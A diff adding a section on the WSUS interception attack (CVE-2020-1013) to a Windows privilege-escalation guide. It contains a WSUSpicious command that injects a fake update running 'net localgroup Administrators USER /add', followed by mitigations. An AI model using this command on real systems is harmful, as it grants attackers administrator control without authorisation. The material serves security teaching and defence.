@@ -3058,6 +3058,16 @@ This vulnerability allows an attacker to abuse Windows system services to conduc
 
 [WSuspicious](https://github.com/GoSecure/wsuspicious) is a C# program that takes the place of the user local proxy and forces the computer to look for updates while intercepting the WSUS traffic to inject a malicious payload.
 
+```bash
+WSUSpicious.exe /command: " -accepteula -s -d cmd /c ""net localgroup Administrators USER /add"" /autoinstall 
+```
+
+:white_check_mark: How to protect against or detect that technique:
+
+- *Architecture*: It is recommended to configure WSUS to use HTTPS
+- *Architecture*: Prevent users from changing their local proxy as in newer version of Windows, proxy settings for Windows Update are controlled by the one defined in Internet Explorer.
+- *Architecture*: Keep your system up-to-date (KB4577041 and KB4571756 for CVE-2020-1013)
+
 #### References
 
 - For the privileges part, thanks to @[decoder-it](https://github.com/decoder-it), his talk "[HIP19: whoami priv - show me your privileges and I will lead you to SYSTEM"](https://www.youtube.com/watch?v=ur2HPyuQlEU)" is a must see
